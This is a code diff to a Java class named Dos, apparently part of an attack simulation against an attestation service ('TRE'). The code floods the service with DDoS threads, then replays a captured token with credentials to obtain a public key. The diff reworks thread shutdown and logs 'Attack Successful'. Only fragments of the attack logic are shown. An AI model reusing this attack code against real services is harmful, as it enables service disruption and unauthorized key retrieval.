@@ -74,6 +74,8 @@ public class Dos extends Pcap4j {
                         stopAttack();
                         log.info("Finish DDOS attack, TRE missed info from PP");
                         startConnectWithToken(username, password);
+                    } else if (message.getMessageType().equals(MessageType.RESPONSE_FROM_TRE_ATTESTATION_REQUEST)) {
+                        log.info("HAHA, Attack Successful!! Get Public Key!!! {}", message.getObject());
                     }
                 } catch (Exception e) {
                     return;
@@ -83,12 +85,10 @@ public class Dos extends Pcap4j {
     }
 
     private void stopAttack() {
-        for (DdosThread thread : ddosThreadList.subList(1, ddosThreadList.size())) {
+        for (DdosThread thread : ddosThreadList) {
             thread.stopAttack();
             thread.interrupt();
         }
-
-        ddosThreadList.get(0).stopAttack();
     }
 
     private class DdosThread extends Thread {
@@ -119,13 +119,10 @@ public class Dos extends Pcap4j {
     private void startConnectWithToken(String userName, String password) {
         log.info("Start trying to connect to TRE");
         AuthenticationMessage authenticationMessage = new AuthenticationMessage(token, userName, password);
-        String jsonInString = null;
         try {
-            jsonInString = Utils.messageToString(new Message(MessageType.ATTESTATION_REQUEST, authenticationMessage));
-            Message responseForPublicKey = ddosThreadList.get(0).socketClient.sendToPort(jsonInString);
-            log.info("SUCCESSFUL connect to TRE, get the public key {}", responseForPublicKey.getObject());
+            String jsonInString = Utils.messageToString(new Message(MessageType.ATTESTATION_REQUEST, authenticationMessage));
+            ddosThreadList.get(0).socketClient.sendToPort(jsonInString);
         } catch (Exception e) {
-            e.printStackTrace();
         }
 
     }
